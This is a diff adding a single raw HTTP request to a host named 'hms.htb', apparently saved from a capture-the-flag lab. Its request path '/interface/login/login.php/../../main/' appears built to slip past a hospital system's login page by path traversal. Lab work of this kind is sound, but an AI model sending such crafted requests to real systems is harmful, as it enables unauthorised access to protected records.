@@ -1,0 +1,12 @@
+GET /interface/login/login.php/../../main/ HTTP/1.1
+Host: hms.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Wed, 06 May 2020 09:03:19 GMT
+If-None-Match: "2001-5a4f70909088c-gzip"
+Cache-Control: max-age=0
+Referer: cache.htb
